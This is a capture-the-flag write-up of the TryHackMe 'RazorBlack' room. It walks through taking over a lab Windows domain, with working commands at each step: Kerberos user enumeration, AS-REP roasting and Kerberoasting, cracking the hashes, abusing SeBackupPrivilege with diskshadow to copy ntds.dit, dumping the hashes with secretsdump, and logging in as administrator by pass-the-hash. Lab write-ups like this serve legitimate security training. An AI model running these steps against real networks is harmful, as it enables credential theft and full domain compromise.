---
description: https://tryhackme.com/room/raz0rblack
---

# RazorBlack

{% hint style="info" %}
This write up does not cover individual flags for the room. This write up is treated as a boot to root from external to domain administrator access.
{% endhint %}

## Nmap

```
sudo nmap 10.10.150.205 -p- -sS -sV

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-13 10:02:50Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  mountd        1-3 (RPC #100005)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Kerberos user enumeration

Hitting kerberos first we perform user enumeration making use of `kerbrute`.

```
kerbrute userenum '/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt' --dc '10.10.35.255' --domain 'raz0rblack.thm'
```

After a short while we obtain a couple of usernames.

![](<../../../.gitbook/assets/image (20) (3).png>)

### No Pre-Authentication

With a coupe of known usernames we run them with Impacket's `GetNPUsers.py` . The user _twilliams_ we find has [No Pre-Authentication](https://ldapwiki.com/wiki/Kerberos%20Pre-Authentication) enabled in Active Directory.

```
GetNPUsers.py 'raz0rblack.thm'/'twilliams': -request -dc-ip '10.10.146.253' -format 'john' -no-pass
```

As such, we are able to pull the `krb5asrep` hash from the user account which can next be used against `John` for cracking.

![](<../../../.gitbook/assets/image (2087).png>)

### Hash Cracking #1

A few minutes of cracking against the `rockyou.tx`t word list we soon reveal the plain text password.

```
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![](../../../.gitbook/assets/2022-08-13\_06-56\_1.png)

### Service Prinicpal Names

With a set of valid credentials we find we are unable to proceed with SMB. Using the same credentials to check for Service Principla Names using Impacket's G`etUserSPNs.py` we are able to pull a hash for the user _xyan1d3_.

```
GetUserSPNs.py raz0rblack.thm/twilliams:'<Password>' -dc-ip '10.10.146.253' -request
```

![](<../../../.gitbook/assets/image (2084).png>)

### Hash Cracking #2

Taking the `krb5tgs` hash we are able to again crack with `John` and the `rockyou.txt` list.

![](../../../.gitbook/assets/2022-08-13\_06-55.png)

### WinRM

With another valid set of credentials we find we are able to login via `WinRM` for remote access using [Evil-WinRM](https://github.com/Hackplayers/evil-winrm).

```
evil-winrm -i '10.10.35.255' -u 'xyan1d3' -p '<Password>'
```

![](<../../../.gitbook/assets/image (2083).png>)

### SeBackupPrivilege

Performing basic enumeration steps we find our current user is a member of the "Backup Operators" group and have privileges for **SeBackupPrivilege**.

![](<../../../.gitbook/assets/image (8) (3).png>)

{% content-ref url="../linux/fusion-corp.md" %}
[fusion-corp.md](../linux/fusion-corp.md)
{% endcontent-ref %}

This privilege grants us the ability to create backups of files on the system. Knowing this, a high value file would be the `ntds.dit` file which is a database of hashes for domain objects / users. As the `ntds.dit` file is in constant use we will be unable to create a backup using normal methods as the system will lock the file.

What we can do instead is create a Distributed Shell File (DSH). This file will contain the appropriate commands for us to run the `diskshadow` utility against the C: drive and ultimately the _`ntds.dit`_ file.

First created a file called `viper.dsh` on the attacking machine. Then insert the following contents:

```
set context persistent nowriters
add volume c: alias viper
create
expose %viper% x:
```

Once completed use the command `unix2dos` to convert the file to DOS format.

```
unix2dos viper.dsh
```

Then on the target system create a directory called 'temp' in `c:\temp.` After this upload the `viper.dsh` file.

![](<../../../.gitbook/assets/image (2095).png>)

Then execute `diskshadow` against the file.

```
diskshadow /s viper.dsh
```

![](<../../../.gitbook/assets/image (2100).png>)

After creating the shadow copy we can then use `robocopy` to copy the `ntds` database to our current working directory.

```
robocopy /b x:\windows\ntds . ntds.dit
```

From here we need to extract the SYSTEM hive which will be required for extracting the hashes with Impacket later.

```
reg save hklm\system c:\Temp\system
```

![](<../../../.gitbook/assets/image (35).png>)

After the registry hives have been saved we can download to our attacking machine.

```
download ntds.dit
download system
```

![](<../../../.gitbook/assets/image (3) (4).png>)

Back on the attacking machine use the following command with Impacket's `secretsdump.py` to extract the hashes from `ntds.dit`.

```
secretsdump.py -ntds ntds.dit -system system local
```

![](<../../../.gitbook/assets/image (2089).png>)

### WinRM (Administrator)

With the Administrators hash we can utilize `Evil-WinRm` again to login as the Domain Administrator.

```
evil-winrm -i '10.10.95.150' -u 'administrator' -H '<Hash>'
```

![](<../../../.gitbook/assets/image (2093).png>)
